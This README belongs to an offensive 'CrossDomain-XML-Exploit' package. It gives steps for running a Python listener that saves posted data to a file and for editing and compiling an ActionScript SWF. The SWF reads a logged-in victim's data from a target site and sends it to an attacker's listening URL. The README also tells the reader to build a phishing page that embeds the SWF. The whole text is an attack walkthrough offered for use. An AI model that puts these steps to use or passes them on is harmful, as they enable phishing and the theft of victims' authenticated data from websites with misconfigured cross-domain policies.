# CrossDomain-XML-Exploit

In this project, the exploit package targets websites with crossdomain xml configuration issues.

This package contains the following files:

## webserver.py
A webserver creating instance. If this file is run, a simple http webserver starts listening to a given port. Run the python file as follows:

```
python webserver.py [PORT NUMBER]
```
Specify `python3` if you are on a `mac/linux` device. The webserver implements a `POST` request recieving technique. A post request to this webserver will recieve the Posted data and will save it to an external `serverResponse.txt` file. 

## crossDomainExploit.as

This is an action script code that can be rendered into `swf`, to be later embeded into an `html` file. Change the following code-portions:

```
public class crossDomainExploit extends Sprite {
    ........
    var readFrom:String = "https://targetsite.com";
```
Change the URL, to your designated targeted URL. The URL to retrieve the data from.

```
private function eventHandler(event:Event):void {
   var sendTo:String = "http://listeningsite.com"
```
Change the listening URL, to your created webserver URL or your any deployed listening site. The URL where data will be posted through the `swf`.

### How to Render SWF?

* Download Apache Royale (https://royale.apache.org/)
* Compile the `.as` file with `mxmlc`.

```
mxmlc ~/path/to/your/file/crossDomainExploit.as
```

A phishing site will also have to be created embeding the `swf` file, so that when the page is loaded, it can retrieve data from the targer site.

## Dependencies
* `swf` has now been obsolete. Only works in legacy platforms.
* The target site needs to be logged into, at the time of openning the phishing URL, to retrieve the target URLs data.
